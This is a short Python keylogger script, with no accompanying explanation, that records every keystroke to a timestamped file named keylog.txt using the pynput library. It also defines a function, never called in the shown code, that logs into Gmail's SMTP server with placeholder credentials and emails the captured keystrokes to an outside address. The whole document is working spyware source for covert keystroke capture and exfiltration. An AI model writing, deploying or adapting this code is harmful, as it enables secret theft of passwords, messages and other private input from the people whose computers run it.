import smtplib
import logging
from pynput.keyboard import Key, Listener

# Set up logging
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define key press event
def on_press(key):
    logging.info(str(key))

# Email the log file
def send_email():
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login("your_email@gmail.com", "your_password")
    with open("keylog.txt", "r") as f:
        server.sendmail("your_email@gmail.com", "target_email@gmail.com", f.read())
    server.quit()

# Set up listener
with Listener(on_press=on_press) as listener:
    listener.join()
